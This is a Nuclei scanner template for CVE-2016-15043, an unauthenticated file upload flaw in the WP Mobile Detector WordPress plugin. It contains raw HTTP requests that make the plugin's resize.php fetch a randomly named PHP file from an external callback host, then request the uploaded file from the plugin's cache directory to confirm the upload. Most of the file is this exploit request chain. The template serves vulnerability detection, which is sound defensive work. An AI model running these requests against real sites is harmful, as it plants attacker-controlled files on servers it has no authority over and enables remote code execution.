id: CVE-2016-15043

info:
  name: WP Mobile Detector <= 3.5 - Unrestricted File Upload
  author: D3nverNg,thewindghost
  severity: critical
  description: |
    WP Mobile Detector WordPress plugin version 3.5 and below contains an unrestricted file upload vulnerability in resize.php. 
    The vulnerability is caused by missing file type validation, allowing unauthenticated attackers to upload arbitrary files, 
    potentially leading to remote code execution.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2016-15043
    - https://wpscan.com/vulnerability/
    - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/wp_mobile_detector_upload_execute.rb
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2016-15043
    cwe-id: CWE-434
  metadata:
    verified: true
    max-request: 2
  tags: cve,cve2016,wordpress,wp-plugin,fileupload,rce,unauth

variables:
  filename: "{{rand_text_alpha(8)}}.php"

http:
  - raw:
      - |
        GET /wp-content/plugins/wp-mobile-detector/resize.php?src=http://{{interactsh-url}}/{{filename}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0
        Connection: close

      - |
        GET /wp-content/plugins/wp-mobile-detector/cache/{{filename}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0
        Connection: close

    req-condition: true

    matchers:
      - type: status
        part: header_2
        status:
          - 200

    extractors:
      - type: regex
        part: body_2
        regex:
          - "<body>(.*?)</body>"
